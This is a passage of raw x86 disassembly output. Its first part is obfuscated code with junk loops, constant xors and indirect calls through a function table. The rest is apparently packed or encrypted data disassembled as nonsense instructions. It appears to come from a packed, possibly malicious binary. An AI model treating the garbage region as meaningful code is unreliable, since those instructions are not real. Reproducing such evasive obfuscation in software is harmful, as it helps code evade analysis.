  40fdca:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  40fdd1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fdd4:	mov    DWORD PTR [ebp+0x8],ecx
  40fdd7:	mov    ecx,DWORD PTR [ebp+0x8]
  40fdda:	xor    DWORD PTR ds:0x42b20a,edi
  40fde0:	xor    ecx,eax
  40fde2:	or     edi,DWORD PTR ds:0x42b182
  40fde8:	add    ecx,esi
  40fdea:	mov    ecx,0x242ebf1
  40fdef:	mov    edi,0xf641bf0
  40fdf4:	je     0x419191
  40fdfa:	add    DWORD PTR ds:0x42b1c2,0x6a2f
  40fe04:	mov    edx,DWORD PTR [ebp+0x8]
  40fe07:	mov    ebx,DWORD PTR ds:0x42b1aa
  40fe0d:	and    ebx,DWORD PTR ds:0x42b1f2
  40fe13:	mov    DWORD PTR ds:0x42b1aa,ebx
  40fe19:	mov    ebx,DWORD PTR [ebp-0x8]
  40fe1c:	xor    edx,eax
  40fe1e:	xor    ebx,eax
  40fe20:	xor    DWORD PTR ds:0x42b1e6,0x42b196
  40fe2a:	sub    edx,ebx
  40fe2c:	sub    edx,esi
  40fe2e:	mov    DWORD PTR ds:0x42b1ce,0x13
  40fe38:	cmp    DWORD PTR ds:0x42b1ce,0x0
  40fe3f:	je     0x40fe81
  40fe45:	cmp    DWORD PTR ds:0x42b1ce,0x1c
  40fe4c:	jb     0x40fe81
  40fe52:	jmp    0x40fe6f
  40fe57:	push   0x42b1ca
  40fe5c:	push   0x42b196
  40fe61:	push   DWORD PTR [ebp-0x1c]
  40fe64:	push   0x42a12c
  40fe69:	call   DWORD PTR ds:0x42b2fa
  40fe6f:	mov    ebx,DWORD PTR ds:0x42b1ce
  40fe75:	dec    ebx
  40fe76:	mov    DWORD PTR ds:0x42b1ce,ebx
  40fe7c:	jmp    0x40fe38
  40fe81:	xor    edx,eax
  40fe83:	and    DWORD PTR ds:0x42b196,0x0
  40fe8d:	jmp    0x40fe9f
  40fe92:	mov    ebx,DWORD PTR ds:0x42b196
  40fe98:	inc    ebx
  40fe99:	mov    DWORD PTR ds:0x42b196,ebx
  40fe9f:	cmp    DWORD PTR ds:0x42b196,0x1b
  40fea6:	jae    0x40feef
  40feac:	cmp    DWORD PTR ds:0x42b196,0x6
  40feb3:	jb     0x40feef
  40feb9:	jmp    0x40fece
  40febe:	push   0x42b226
  40fec3:	push   0x42a000
  40fec8:	call   DWORD PTR ds:0x42b2fe
  40fece:	cmp    DWORD PTR ds:0x42b196,0x5
  40fed5:	jne    0x40feea
  40fedb:	xor    ebx,ebx
  40fedd:	add    ebx,DWORD PTR ds:0x42b196
  40fee3:	inc    ebx
  40fee4:	mov    DWORD PTR ds:0x42b196,ebx
  40feea:	jmp    0x40fe92
  40feef:	mov    DWORD PTR [ebp+0x8],edx
  40fef2:	and    DWORD PTR ds:0x42b196,0x0
  40fefc:	jmp    0x40ff10
  40ff01:	xor    ebx,ebx
  40ff03:	xor    ebx,DWORD PTR ds:0x42b196
  40ff09:	inc    ebx
  40ff0a:	mov    DWORD PTR ds:0x42b196,ebx
  40ff10:	cmp    DWORD PTR ds:0x42b196,0x15
  40ff17:	jae    0x40ff62
  40ff1d:	cmp    DWORD PTR ds:0x42b196,0x4
  40ff24:	jb     0x40ff62
  40ff2a:	jmp    0x40ff43
  40ff2f:	push   DWORD PTR [ebp-0xc]
  40ff32:	push   DWORD PTR [ebp-0x1c]
  40ff35:	push   0x42a1d7
  40ff3a:	push   DWORD PTR [ebp-0xc]
  40ff3d:	call   DWORD PTR ds:0x42b306
  40ff43:	cmp    DWORD PTR ds:0x42b196,0x3
  40ff4a:	jne    0x40ff5d
  40ff50:	mov    ebx,DWORD PTR ds:0x42b196
  40ff56:	inc    ebx
  40ff57:	mov    DWORD PTR ds:0x42b196,ebx
  40ff5d:	jmp    0x40ff01
  40ff62:	mov    edx,DWORD PTR [ebp+0x8]
  40ff65:	and    DWORD PTR ds:0x42b21a,0x0
  40ff6f:	jmp    0x40ff81
  40ff74:	mov    ebx,DWORD PTR ds:0x42b21a
  40ff7a:	inc    ebx
  40ff7b:	mov    DWORD PTR ds:0x42b21a,ebx
  40ff81:	cmp    DWORD PTR ds:0x42b21a,0x17
  40ff88:	jae    0x40ffd0
  40ff8e:	cmp    DWORD PTR ds:0x42b21a,0xe
  40ff95:	jb     0x40ffd0
  40ff9b:	jmp    0x40ffb1
  40ffa0:	push   0x42a23f
  40ffa5:	push   DWORD PTR [ebp-0x20]
  40ffa8:	push   DWORD PTR [ebp-0xc]
  40ffab:	call   DWORD PTR ds:0x42b30e
  40ffb1:	cmp    DWORD PTR ds:0x42b21a,0xd
  40ffb8:	jne    0x40ffcb
  40ffbe:	mov    ebx,DWORD PTR ds:0x42b21a
  40ffc4:	inc    ebx
  40ffc5:	mov    DWORD PTR ds:0x42b21a,ebx
  40ffcb:	jmp    0x40ff74
  40ffd0:	mov    ebx,DWORD PTR [ebp-0x58]
  40ffd3:	add    DWORD PTR ds:0x42b20e,0x42b1de
  40ffdd:	add    edx,0x5708e2
  40ffe3:	imul   edx,ebx
  40ffe6:	or     DWORD PTR ds:0x42b1b6,0x7440
  40fff0:	mov    DWORD PTR [ebp-0x58],edx
  40fff3:	sub    DWORD PTR ds:0x42b192,ecx
  40fff9:	jmp    0x412359
  40fffe:	add    al,0x23
  410000:	cld    
  410001:	shl    esp,1
  410003:	mov    al,BYTE PTR [edx]
  410005:	xchg   edx,eax
  410006:	(bad)  
  410009:	retf   0x2444
  41000c:	xor    ch,BYTE PTR ds:0x8383af3f
  410012:	ds pop esi
  410014:	add    DWORD PTR [ebx+0x593155e2],0xffffffaa
  41001b:	les    edx,FWORD PTR [ebx]
  41001d:	push   ebx
  41001e:	(bad)  
  41001f:	adc    ah,BYTE PTR [ecx]
  410021:	shl    ch,0x94
  410024:	cdq    
  410025:	(bad)  
  410026:	in     eax,dx
  410027:	leave  
  410028:	xchg   ebp,eax
  410029:	sbb    eax,0x6d6d86c5
  41002e:	inc    eax
  41002f:	jne    0x410043
  410031:	add    DWORD PTR [ecx+0x7b],eax
  410034:	push   es
  410035:	sbb    eax,0x912326e3
  41003a:	mul    DWORD PTR [ebx]
  41003c:	mov    ebx,0x166b6149
  410041:	shr    edx,cl
  410043:	icebp  
  410044:	mov    DWORD PTR [eax],edi
  410046:	outs   dx,BYTE PTR ds:[esi]
  410047:	(bad)  
  410048:	xchg   edx,eax
  410049:	jmp    0x41005e
  41004b:	mov    BYTE PTR [edi-0x416a7d46],bl
  410051:	ficom  DWORD PTR [esi]
  410053:	adc    eax,0xacefd618
  410058:	cmp    ebp,eax
  41005a:	sbb    eax,0x2abbccbf
  41005f:	cdq    
  410060:	repnz dec eax
  410062:	je     0x41003b
  410064:	mov    ecx,0xcbd7ed47
  410069:	std    
  41006a:	hlt    
  41006b:	retf   0x1f00
  41006e:	push   0x70ef6e92
  410073:	mov    DWORD PTR [eax+0x2],ebx
  410076:	out    0x78,al
  410078:	daa    
  410079:	push   eax
  41007a:	cmc    
  41007b:	sbb    al,0x5b
  41007d:	cs (bad) 
  41007f:	popa   
  410080:	(bad)  
  410081:	pop    esp
  410082:	mov    ecx,0x87f4e912
  410087:	enter  0x177d,0xad
  41008b:	pop    ecx
  41008c:	push   ss
  41008d:	mov    dh,0xe5
  41008f:	ins    BYTE PTR es:[edi],dx
  410090:	call   0x645c7bb2
  410095:	jo     0x410089
  410097:	pop    ds
  410098:	push   esi
  410099:	retf   0x5389
  41009c:	add    BYTE PTR [ebx+0x2fdbf505],0x5
  4100a3:	stos   DWORD PTR es:[edi],eax
  4100a4:	dec    ebp
  4100a5:	les    edi,FWORD PTR [ebx+0x1df992eb]
  4100ab:	mov    eax,DWORD PTR [esi-0x31]
  4100ae:	dec    edi
  4100af:	cmp    ch,dh
  4100b1:	jno    0x410112
  4100b3:	lahf   
  4100b4:	jmp    FWORD PTR [edx+0x13]
  4100b7:	add    dl,bl
  4100b9:	adc    al,BYTE PTR [ecx]
  4100bb:	and    dh,BYTE PTR [esi]
  4100bd:	or     DWORD PTR [edi+edx*8+0x7dd91fe4],esp
  4100c4:	sbb    esi,DWORD PTR [eax+0xe]
  4100c7:	mov    ebx,0x419fe355
  4100cc:	leave  
  4100cd:	scas   eax,DWORD PTR es:[edi]
  4100ce:	aad    0x8a
  4100d0:	or     ebp,eax
  4100d2:	mov    al,ds:0xd73b03fd
  4100d7:	xchg   ebp,eax
  4100d8:	icebp  
  4100d9:	jecxz  0x410133
  4100db:	aad    0x4c
  4100dd:	sbb    BYTE PTR [eax],ah
  4100df:	add    BYTE PTR [esi],dl
  4100e1:	pusha  
  4100e2:	pop    esp
  4100e3:	xchg   esi,eax
  4100e4:	rcl    BYTE PTR [ecx-0x50],1
  4100e7:	rol    DWORD PTR [ecx-0x4fc79964],1
  4100ed:	push   ds
  4100ee:	std    
  4100ef:	scas   al,BYTE PTR es:[edi]
  4100f0:	adc    al,0x79
  4100f3:	scas   eax,DWORD PTR es:[edi]
  4100f4:	ins    BYTE PTR es:[edi],dx
  4100f5:	sahf   
  4100f6:	adc    ebp,DWORD PTR [esi]
  4100f8:	add    BYTE PTR [edx+0x3e],al
  4100fb:	inc    edi
  4100fc:	fisttp DWORD PTR [ebx-0x3b]
  4100ff:	aam    0x7c
  410101:	cmp    al,0x60
  410103:	dec    ebp
  410104:	sub    ah,bl
  410106:	rcl    BYTE PTR [ecx+0x21],1
  410109:	ins    BYTE PTR es:[edi],dx
  41010a:	arpl   WORD PTR [ebx+0xa],dx
  41010d:	dec    edi
  41010e:	loop   0x410174
  410110:	cdq    
  410111:	es in  eax,dx
  410113:	stos   BYTE PTR es:[edi],al
  410114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410115:	adc    al,0xd5
  410117:	ins    BYTE PTR es:[edi],dx
  410118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410119:	pop    esp
  41011a:	scas   al,BYTE PTR es:[edi]
  41011b:	neg    BYTE PTR [edi+0x1be82ac5]
  410121:	jg     0x4100e8
  410123:	hlt    
  410124:	daa    
  410125:	and    al,0x4d
  410127:	test   DWORD PTR [eax-0x1827d03c],ebp
  41012d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41012e:	jo     0x410167
  410130:	pop    es
  410131:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410132:	inc    esi
  410133:	imul   ebp,DWORD PTR ss:[esi],0xfe10f199
  41013a:	push   eax
  41013b:	sub    eax,DWORD PTR [ebx+ebp*2-0x310ebc44]
  410142:	mov    ch,0x7
  410144:	sbb    eax,0xa6128eb6
  410149:	ins    BYTE PTR es:[edi],dx
  41014a:	mov    ecx,0xefff2d4e
  41014f:	sbb    esp,DWORD PTR [esi]
  410151:	add    al,0x24
  410153:	(bad)  
  410154:	mov    al,ds:0x67d84abe
  410159:	xor    BYTE PTR es:[edx+0x45],dh
  41015d:	pop    edx
  41015e:	(bad)  
  41015f:	mov    ebp,?
  410161:	push   edx
  410162:	aas    
  410163:	push   cs
  410164:	stos   BYTE PTR es:[edi],al
  410165:	mov    edx,0xf96cda4d
  41016a:	sbb    DWORD PTR [ecx+0x22],eax
  41016d:	push   esp
  41016e:	cmc    
  41016f:	push   ebx
  410170:	loope  0x4101b6
  410172:	inc    edi
  410173:	lahf   
  410174:	inc    esp
  410175:	push   ebp
  410176:	xchg   ecx,eax
  410177:	mov    ebx,0x7bf657de
  41017c:	push   edi
  41017d:	push   cs
  41017e:	pop    ebx
  41017f:	pop    ds
  410180:	ins    DWORD PTR es:[edi],dx
  410181:	pushf  
  410182:	push   edi
  410183:	mov    al,ds:0x6cf3789e
  410188:	mov    al,0xa4
  41018a:	cmc    
  41018b:	sti    
  41018c:	cmp    BYTE PTR [edx],bh
  41018e:	mov    ecx,0x9ee6a414
  410193:	call   0xa7bc8199
  410198:	stos   BYTE PTR es:[edi],al
  410199:	add    ecx,esi
  41019b:	xchg   edx,eax
  41019c:	inc    edx
  41019d:	std    
  41019e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41019f:	adc    edx,DWORD PTR [edx]
  4101a1:	mov    ch,0x16
  4101a3:	and    dl,BYTE PTR [eax]
  4101a5:	das    
  4101a6:	push   ebp
  4101a7:	addr16 hlt 
  4101a9:	cwde   
  4101aa:	push   0x610b5b34
  4101af:	push   ss
  4101b0:	mov    ds:0x21ad1466,al
  4101b5:	mov    ebp,gs
  4101b7:	sahf   
  4101b8:	add    eax,0x12861ffa
  4101bd:	inc    esp
  4101be:	lock les ebp,FWORD PTR [edx+0x1e]
  4101c2:	sahf   
  4101c3:	push   0x75
  4101c5:	add    eax,0xf6e5a128
  4101ca:	cs mov bl,0xc1
  4101cd:	mov    dl,0x2b
  4101cf:	add    esi,0x2a9ea632
  4101d5:	dec    eax
  4101d6:	add    ecx,DWORD PTR [edi+0x2f4ffe10]
  4101dc:	jo     0x410177
  4101de:	lea    eax,[ecx+0x7b]
  4101e1:	jmp    0xeaf04655
  4101e6:	cld    
  4101e7:	arpl   di,bp
  4101e9:	iret   
  4101ea:	xor    DWORD PTR [edi+0x75],0x9
  4101ee:	push   ds
  4101ef:	jg     0x41019b
  4101f1:	cmp    eax,0xd2f6ea0f
  4101f6:	cmp    bl,BYTE PTR [ecx+0x212a504e]
  4101fc:	mov    dh,0xb
  4101fe:	leave  
  4101ff:	gs (bad) 
  410201:	out    dx,eax
  410202:	je     0x4101a7
  410204:	rol    ecx,cl
  410206:	scas   eax,DWORD PTR es:[edi]
  410207:	leave  
  410208:	cmp    ch,0x1c
  41020b:	mov    ebx,0x205477b1
  410210:	scas   eax,DWORD PTR es:[edi]
  410211:	(bad)  
  410212:	stos   BYTE PTR es:[edi],al
  410213:	add    edx,DWORD PTR [edx]
  410215:	push   0x3b
  410217:	test   eax,0x900e1f05
  41021c:	mov    dl,0xa7
  41021e:	or     edi,0xffffffbc
  410221:	in     eax,dx
  410222:	cmp    al,0x8e
  410224:	stos   BYTE PTR es:[edi],al
  410225:	inc    edx
  410226:	jno    0x410296
  410228:	mov    bl,0xec
  41022a:	adc    BYTE PTR [edi+esi*1-0x65b8c2b7],cl
  410231:	ret    0x4f77
  410234:	push   esi
  410235:	lods   al,BYTE PTR ds:[esi]
  410236:	mov    ecx,0xd65e38d8
  41023b:	fiadd  DWORD PTR [ebp-0x35]
  41023e:	in     al,0x8b
  410240:	add    al,0x51
  410242:	adc    bh,BYTE PTR [ebx-0xddc7f0a]
  410248:	loop   0x410220
  41024a:	into   
  41024b:	mov    ah,dh
  41024d:	fnstsw WORD PTR [ebp+0x1beeaf33]
  410253:	les    edx,FWORD PTR [edi+0x17523f97]
  410259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41025a:	sbb    BYTE PTR [edx],cl
  41025c:	cwde   
  41025d:	pop    eax
  41025e:	jg     0x41026a
  410260:	fcmovne st,st(5)
  410262:	add    cl,0x79
  410265:	push   0x29
  410267:	das    
  410268:	fsubrp st(2),st
  41026a:	dec    edx
  41026b:	sbb    DWORD PTR [edi],0x64
  41026e:	mov    dl,0x60
  410270:	(bad)  
  410271:	das    
  410272:	arpl   bx,cx
  410274:	jmp    0x410200
  410276:	aad    0x38
  410278:	cs call 0x74996ff4
  41027e:	nop
  41027f:	or     al,0x55
  410281:	or     BYTE PTR [ecx-0x72],ch
  410284:	leave  
  410285:	xlat   BYTE PTR ds:[ebx]
  410286:	xor    al,0x10
  410288:	enter  0xa40e,0x7c
  41028c:	pop    ebx
  41028d:	sbb    esp,esp
  41028f:	(bad)  
  410290:	ins    BYTE PTR es:[edi],dx
  410291:	or     al,BYTE PTR [ebx+0x2a]
  410294:	mov    bl,0x6
  410296:	into   
  410297:	push   0x31
  410299:	push   edi
  41029a:	fptan  
  41029c:	aad    0x97
  41029e:	push   es
  41029f:	(bad)  
  4102a0:	xor    DWORD PTR [esi-0xe],ebx
  4102a3:	pop    bp
  4102a5:	les    ebx,FWORD PTR [ecx+0x4f1a5374]
  4102ab:	int    0x70
  4102ad:	cmp    eax,0x86331004
  4102b2:	mov    edi,0xc92a328a
  4102b7:	or     al,0x67
  4102b9:	popf   
  4102ba:	daa    
  4102bb:	pusha  
  4102bc:	adc    al,0x4b
  4102be:	or     esp,eax
  4102c0:	les    edi,FWORD PTR [edi-0x1fe0b6d]
  4102c6:	sbb    al,0x9
  4102c8:	fnstenv [ecx+0xe]
  4102cb:	jns    0x410252
  4102cd:	mov    esp,0x4bdb2b70
  4102d2:	shl    DWORD PTR [ecx+edx*1+0x2d],cl
  4102d6:	shl    BYTE PTR [edx+edx*1+0x34f2996a],1
  4102dd:	adc    bl,bh
  4102df:	(bad)  
  4102e0:	adc    al,0x2e
  4102e2:	dec    ebp
  4102e3:	pop    ds
  4102e4:	add    DWORD PTR [edx],esp
  4102e6:	shl    bl,0xe8
  4102e9:	rcl    BYTE PTR [ecx-0x40],0xba
  4102ed:	inc    edi
  4102ee:	adc    al,0xbf
  4102f0:	dec    esi
  4102f1:	and    bl,BYTE PTR [esi]
  4102f3:	sar    DWORD PTR [ebp+0x67],cl
  4102f6:	mov    ecx,0xccec022c
  4102fb:	jb     0x41037a
  4102fd:	les    edx,FWORD PTR [edx+ebp*8]
  410300:	call   FWORD PTR [ecx+0x572f98f2]
  410306:	test   BYTE PTR [ebp+0x33cf2025],ch
  41030c:	adc    BYTE PTR [edx],0xa3
  41030f:	aam    0xcd
  410311:	es loop 0x4102a1
  410314:	push   ebp
  410315:	mov    esi,0x1085dfd7
  41031a:	sbb    dh,cl
  41031c:	jmp    0x2e9ba8a1
  410321:	add    al,0x54
  410323:	mov    eax,ds:0xd2c5ea1
  410328:	push   0xffffffc7
  41032a:	mov    ds:0x31fe019d,al
  41032f:	call   0x448:0xf8bf4356
  410336:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410337:	jmp    0x8f1e:0xa0fc340b
  41033e:	jl     0x4102f1
  410340:	sbb    dl,dh
  410342:	inc    BYTE PTR [ebp-0x56]
  410345:	jmp    0x410370
  410347:	adc    al,0xb8
  410349:	add    cl,BYTE PTR [ebx-0x5a3c2851]
  41034f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410350:	pop    es
  410351:	cmp    edi,ecx
  410353:	pop    edx
  410354:	jge    0x410334
  410356:	pop    ebp
  410357:	push   edx
  410358:	cli    
  410359:	xchg   edx,eax
  41035a:	popf   
  41035b:	fimul  DWORD PTR [ecx+0x24]
  41035e:	xchg   edx,eax
  41035f:	into   
  410360:	push   cs
  410361:	scas   eax,DWORD PTR es:[edi]
  410362:	out    dx,al
  410363:	in     eax,dx
  410364:	or     al,0x95
  410366:	mov    dl,0x70
  410368:	sub    BYTE PTR [eax+0x75],cl
  41036b:	push   cs
  41036c:	stc    
  41036d:	pop    ebp
  41036e:	xchg   ebp,eax
  41036f:	aad    0x4c
  410371:	adc    BYTE PTR [edx-0x3],dh
  410374:	inc    esp
  410375:	mov    eax,ds:0x8c6f7cc
  41037a:	jno    0x410354
  41037c:	or     DWORD PTR [esi-0x1f9ddf12],ebp
  410382:	cmc    
  410383:	or     bl,BYTE PTR [esi]
  410385:	and    BYTE PTR [eax+0x7012ded1],bl
  41038b:	(bad)  
  41038c:	mov    ds:0x43110ddb,eax
  410391:	jns    0x41040a
  410393:	dec    ebx
  410394:	stos   DWORD PTR es:[edi],eax
  410395:	add    al,BYTE PTR [edx+0x4fd89881]
  41039b:	lahf   
  41039c:	and    al,0x46
  41039e:	sbb    DWORD PTR [ecx+esi*1-0x77],eax
  4103a2:	test   al,0xeb
  4103a4:	cmp    cl,BYTE PTR [edx+esi*8-0x19f1ed15]
  4103ab:	adc    DWORD PTR [ebx],edi
  4103ad:	call   0xb809:0xb9c8ae31
  4103b4:	sti    
  4103b5:	push   cs
  4103b6:	dec    eax
  4103b7:	adc    dh,ch
  4103b9:	mov    ah,BYTE PTR [edx-0x1e47d8a4]
  4103bf:	cmp    ebp,DWORD PTR [ebx-0x1700047a]
  4103c5:	push   edi
  4103c6:	sub    DWORD PTR [ebx-0x4c],esp
  4103c9:	push   ebx
  4103ca:	push   eax
  4103cb:	sbb    al,0xe6
  4103cd:	dec    bh
  4103cf:	popf   
  4103d0:	test   eax,0xfa5b2dfc
  4103d5:	pop    esp
  4103d6:	inc    ecx
  4103d7:	pop    ebp
  4103d8:	sbb    cl,BYTE PTR [eax+0x42c616e9]
  4103de:	add    ebp,eax
  4103e0:	stos   BYTE PTR es:[edi],al
  4103e1:	adc    dh,BYTE PTR [edx-0x1f]
  4103e4:	mov    bh,BYTE PTR es:[edi-0x30429ff2]
  4103eb:	mov    ds:0xf8a1bdf2,al
  4103f0:	repz mov bl,0xcd
  4103f3:	fs push ebx
  4103f5:	xchg   ebx,eax
  4103f6:	daa    
  4103f7:	xor    edi,DWORD PTR [ecx-0x2a913a33]
  4103fd:	lock dec ebp
  4103ff:	inc    esi
  410400:	or     eax,0x5c08910f
  410405:	jo     0x41047e
  410407:	sbb    ebx,ebp
  410409:	aam    0x8b
  41040b:	loope  0x4103ef
  41040d:	or     DWORD PTR [esi],edi
  41040f:	shr    ecx,cl
  410411:	test   eax,0x71dd825e
  410416:	cmp    edx,DWORD PTR [eax-0x5196c30e]
  41041c:	fwait
  41041d:	or     BYTE PTR [ebp+eiz*8-0x6ed493b0],bh
  410424:	push   edi
  410425:	enter  0xa6b6,0xbb
  410429:	aaa    
  41042a:	inc    edi
  41042b:	bound  eax,QWORD PTR [ebx+ebp*8]
  41042e:	retf   0x8ee4
  410431:	(bad)  
  410432:	sub    bh,bh
  410434:	sub    al,0xa4
  410437:	and    eax,0x57a99edd
  41043c:	dec    edi
  41043d:	ja     0x410406
  41043f:	jnp    0x410487
  410441:	popa   
  410442:	das    
  410443:	(bad)  
  410444:	mov    ch,0x4f
  410446:	cli    
  410447:	inc    ebx
  410448:	retf   
  410449:	cmp    BYTE PTR [esi+eiz*2-0xee76b24],ah
  410450:	(bad)  
  410451:	stos   DWORD PTR es:[edi],eax
  410452:	fldenv [ecx+esi*2-0xc]
  410456:	sti    
  410457:	cld    
  410458:	xchg   esp,eax
  410459:	(bad)  
  41045a:	and    ch,BYTE PTR [ebp+eax*8+0x47]
  41045e:	popa   
  41045f:	cmp    al,0xa9
  410461:	loop   0x410488
  410463:	xor    BYTE PTR [edi+eax*4],dh
  410466:	imul   BYTE PTR [edx+0x7fedf3e3]
  41046c:	pop    ebx
  41046d:	stos   DWORD PTR es:[edi],eax
  41046e:	test   al,0x25
  410470:	ins    DWORD PTR es:[edi],dx
  410471:	or     al,0x31
  410473:	in     al,dx
  410474:	push   DWORD PTR [esi+ecx*2+0x47938e05]
  41047b:	mov    ?,WORD PTR [ebx+eax*8]
  41047e:	or     eax,0x17ed4776
  410483:	lods   al,BYTE PTR ds:[esi]
  410484:	fsubrp st(3),st
  410486:	rcr    BYTE PTR [esi+0x7f169d6a],0xa
  41048d:	and    BYTE PTR [edx+0x5044ea25],ch
  410493:	lock fmul DWORD PTR [edi-0x1e836ce3]
  41049a:	mov    ebx,0x614706d5
  41049f:	jno    0x4104d7
  4104a1:	rol    DWORD PTR [eax],1
  4104a3:	pop    ebx
  4104a4:	or     al,0x34
  4104a6:	sti    
  4104a7:	inc    ebp
  4104a8:	cs retf 0xaa70
  4104ac:	jno    0x41044e
  4104ae:	pop    ebp
  4104af:	sub    cl,BYTE PTR [ebx+0x3ce54f02]
  4104b5:	mov    WORD PTR [edx+0x570f07ea],es
  4104bb:	ins    DWORD PTR es:[edi],dx
  4104bc:	repnz adc esi,DWORD PTR [esi+0x65]
  4104c0:	into   
  4104c1:	add    edx,DWORD PTR [edi-0x6bca947c]
  4104c7:	test   BYTE PTR [eax],0x21
  4104ca:	stc    
  4104cb:	ret    0x5bab
  4104ce:	hlt    
  4104cf:	fcomp  st(2)
  4104d1:	xchg   DWORD PTR [ebp+0x2a21e590],edi
  4104d7:	push   cs
  4104d8:	inc    eax
  4104d9:	xchg   edi,eax
  4104da:	mov    edx,0xf751a678
  4104df:	cmc    
  4104e0:	shl    al,1
  4104e2:	push   0x1db9bec3
  4104e7:	xor    al,0x9e
  4104e9:	es push eax
  4104eb:	out    0xbc,eax
  4104ed:	add    DWORD PTR [ebp+0x36],edi
  4104f0:	mov    esp,0x2bb800d9
  4104f5:	pop    ss
  4104f6:	ret    0x674d
  4104f9:	add    BYTE PTR [esi-0x727bc75c],ah
  4104ff:	cmp    al,dh
  410501:	(bad)  
  410502:	scas   eax,DWORD PTR es:[edi]
  410503:	pop    DWORD PTR [ecx+0x73]
  410506:	dec    ecx
  410507:	pop    ss
  410508:	pop    ds
  410509:	jno    0x4104bc
  41050b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41050c:	jae    0x41054e
  41050e:	dec    ebx
  41050f:	push   edi
  410510:	ins    DWORD PTR es:[edi],dx
  410511:	pop    esi
  410512:	iret   
  410513:	and    ah,al
  410515:	dec    edi
  410516:	call   0x17262fd0
  41051b:	push   eax
  41051c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41051d:	push   edi
  41051e:	scas   eax,DWORD PTR es:[edi]
  41051f:	pop    es
  410520:	mov    ebp,0x2aa2c064
  410525:	sti    
  410526:	inc    eax
  410527:	fiadd  DWORD PTR [esi-0x2df8daab]
  41052d:	(bad)  
  41052e:	test   al,0x5c
  410530:	mov    ecx,0x459fc713
  410535:	xchg   esi,eax
  410536:	inc    esi
  410537:	add    eax,0xed49799b
  41053c:	push   es
  41053d:	lea    ecx,[ecx]
  41053f:	push   ds
  410540:	mov    ecx,0x9dc2bb34
  410545:	xchg   edx,eax
  410546:	mov    WORD PTR [ecx],ds
  410548:	push   es
  410549:	loope  0x4104fc
  41054b:	lock jmp 0x410517
  41054e:	mov    gs,WORD PTR [ebx+edx*2]
  410551:	jp     0x41059c
  410553:	aad    0x34
  410555:	jae    0x410513
  410557:	mov    ah,0x71
  410559:	das    
  41055a:	pop    ebx
  41055b:	inc    edi
  41055c:	and    DWORD PTR [ebx-0x26],edi
  41055f:	add    BYTE PTR [edi+0x4f],cl
  410562:	dec    ebp
  410563:	ds ins DWORD PTR es:[edi],dx
  410565:	ret    0xcd23
  410568:	jne    0x410579
  41056a:	xchg   ebp,eax
  41056b:	sbb    al,BYTE PTR [ecx-0x2f]
  41056e:	in     eax,0xab
  410570:	xchg   esp,eax
  410571:	xor    DWORD PTR [esi+0xb],0x69bb1bc5
  410578:	jns    0x410510
  41057a:	mov    ds:0xdc1b6faa,eax
  41057f:	test   DWORD PTR [edx+0x64],eax
  410582:	inc    edi
  410583:	cmp    BYTE PTR [edx-0x20],dl
  410586:	vpmulhw ymm7,ymm4,YMMWORD PTR [eax]
  41058a:	sub    cl,BYTE PTR [ebx-0x4c]
  41058d:	sbb    ch,BYTE PTR [ecx-0x420af8bb]
  410593:	sahf   
  410594:	scas   eax,DWORD PTR es:[edi]
  410595:	adc    eax,eax
  410597:	pextrw esi,mm6,0x2b
  41059b:	not    cl
  41059d:	dec    esi
  41059e:	rol    DWORD PTR [ecx+0x3b],0x7a
  4105a2:	push   ecx
  4105a3:	push   0xc020350f
  4105a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105a9:	inc    edi
  4105aa:	sbb    DWORD PTR [eax+0x5997ab4b],edx
  4105b0:	jge    0x410568
  4105b2:	pop    eax
  4105b3:	pop    edi
  4105b4:	jb     0x410592
  4105b6:	fidiv  DWORD PTR [eax-0x7e]
  4105b9:	jmp    0x4105a1
  4105bb:	imul   esp,DWORD PTR [edi+edx*2],0xffffffe2
  4105bf:	jo     0x410574
  4105c1:	add    DWORD PTR [ebx-0x7f743e4a],edi
  4105c7:	ins    BYTE PTR es:[edi],dx
  4105c8:	xchg   edi,eax
  4105c9:	adc    DWORD PTR [esi-0x4c],esi
  4105cc:	sbb    al,BYTE PTR [eax-0x600e0256]
  4105d2:	imul   BYTE PTR [ebx]
  4105d4:	dec    eax
  4105d5:	lock inc ebx
  4105d7:	repz xchg edi,eax
  4105d9:	mov    al,0xe8
  4105db:	inc    edx
  4105dc:	in     eax,dx
  4105dd:	xor    dl,BYTE PTR [esi]
  4105df:	inc    esp
  4105e0:	sub    ch,bl
  4105e2:	jb     0x4105fb
  4105e4:	icebp  
  4105e5:	daa    
  4105e6:	ror    DWORD PTR [esi+ecx*4-0x58],1
  4105ea:	mov    WORD PTR [eax-0x4c7718c7],?
  4105f0:	inc    ecx
  4105f1:	mov    es,WORD PTR [esi+0x9]
  4105f4:	mov    al,0xe6
  4105f6:	add    dh,dh
  4105f8:	and    bl,BYTE PTR [ebp+0x737855b5]
  4105fe:	clc    
  4105ff:	int3   
  410600:	add    DWORD PTR [ecx+0x1c],ecx
  410603:	and    al,0xa4
  410605:	dec    eax
  410606:	xchg   ebx,eax
  410607:	das    
  410608:	repz imul ebx,DWORD PTR [edx-0x2c9fa290],0xaafed5b2
  410613:	dec    esp
  410614:	dec    eax
  410615:	add    esp,DWORD PTR [esi]
  410617:	aam    0xd2
  410619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41061a:	and    al,BYTE PTR [esi+0x460eae1c]
  410620:	xchg   esp,eax
  410621:	(bad)  
  410623:	div    DWORD PTR [esi-0x288bb389]
  410629:	cmp    bh,BYTE PTR [ebx+0x37]
  41062c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41062d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41062e:	sub    DWORD PTR [ecx],ebp
  410630:	mov    ebx,0x12ede7d3
  410635:	push   edx
  410636:	fild   WORD PTR [edx]
  410638:	dec    ebp
  410639:	push   edx
